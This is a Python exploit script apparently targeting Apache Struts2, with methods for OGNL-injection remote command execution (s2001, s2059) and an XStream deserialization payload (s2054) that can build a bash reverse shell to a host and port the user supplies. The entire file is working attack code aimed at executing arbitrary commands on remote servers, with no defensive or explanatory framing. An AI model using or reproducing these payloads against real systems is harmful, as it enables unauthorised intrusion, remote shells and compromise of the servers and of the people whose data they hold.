import requests
class s2_exp :
    url=""
    def __init__(self,url):
        self.url = url
    def s2001(self,key,cmd,POST=True): #001 005
        para ={}
        pll =[ '%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"/bin/sh","-c","__cmd__"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}',
              """' + (#_memberAccess["allowStaticMethodAccess"]=true,#foo=new java.lang.Boolean("false") ,#context["xwork.MethodAccessor.denyMethodExecution"]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('__cmd__').getInputStream())) + '""",
              '''${#_memberAccess["allowStaticMethodAccess"]=true,#a=@java.lang.Runtime@getRuntime().exec('__cmd__').getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[50000],#c.read(#d),#out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#out.println('dbapp='+new java.lang.String(#d)),#out.close()}''',
        ]

        for pl in pll:
            for k in key:
                para[k]= pl.replace("__cmd__",cmd)
            if POST:
                print(requests.post(self.url,data=para).text)
            else:
                print(requests.get(self.url,params=para).text)

    def s2054(self,uri,cmd="ls",re=None):
        h = {"Content-Type":"application/xml"}
        pl = '''<map>
  <entry>
    <jdk.nashorn.internal.objects.NativeString>
      <flags>0</flags>
      <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
        <dataHandler>
          <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">
            <is class="javax.crypto.CipherInputStream">
              <cipher class="javax.crypto.NullCipher">
                <initialized>false</initialized>
                <opmode>0</opmode>
                <serviceIterator class="javax.imageio.spi.FilterIterator">
                  <iter class="javax.imageio.spi.FilterIterator">
                    <iter class="java.util.Collections$EmptyIterator"/>
                    <next class="java.lang.ProcessBuilder">
                        <command> 
                            __cmd__
                        </command> 
                      <redirectErrorStream>false</redirectErrorStream>
                    </next>
                  </iter>
                  <filter class="javax.imageio.ImageIO$ContainsFilter">
                    <method>
                      <class>java.lang.ProcessBuilder</class>
                      <name>start</name>
                      <parameter-types/>
                    </method>
                    <name>foo</name>
                  </filter>
                  <next class="string">foo</next>
                </serviceIterator>
                <lock/>
              </cipher>
              <input class="java.lang.ProcessBuilder$NullInputStream"/>
              <ibuffer></ibuffer>
              <done>false</done>
              <ostart>0</ostart>
              <ofinish>0</ofinish>
              <closed>false</closed>
            </is>
            <consumed>false</consumed>
          </dataSource>
          <transferFlavors/>
        </dataHandler>
        <dataLen>0</dataLen>
      </value>
    </jdk.nashorn.internal.objects.NativeString>
    <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/>
  </entry>
  <entry>
    <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
    <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
  </entry>
</map>'''
        cmd =cmd.split(' ')
        cmdstr = ""
        if re ==None:
            for i in cmd:
                j=i.replace('"','')
                cmdstr+=f'<string>{j}</string>'
        else:
            if ":" in re:
                re = re.split(":")
            elif "/" in re:
                re = re.split("/")
            elif " "in re:
                re=re.split(' ')
            cmdstr = f'''<string>bash</string> 
                    <string>-c</string> 
                    <string>bash -i >&amp;  /dev/tcp/{re[0]}/{re[1]} 0>&amp; 1</string>
                    '''
        pl = pl.replace("__cmd__",cmdstr)
        ses = requests.session()
        ses.get(self.url)
        print(self.url+uri,ses.post(self.url+uri,headers=h,data=pl.encode()).status_code)

    def s2059(self,key,cmd):
        data1 = {
            key: "%{(#context=#attr['struts.valueStack'].context).(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.setExcludedClasses('')).(#ognlUtil.setExcludedPackageNames(''))}"
        }
        data2 = {
            key: "%{(#context=#attr['struts.valueStack'].context).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec('__cmd__'))}".replace("__cmd__",cmd)
        }
        res1 = requests.post(self.url, data=data1)
        res2 = requests.post(self.url, data=data2)


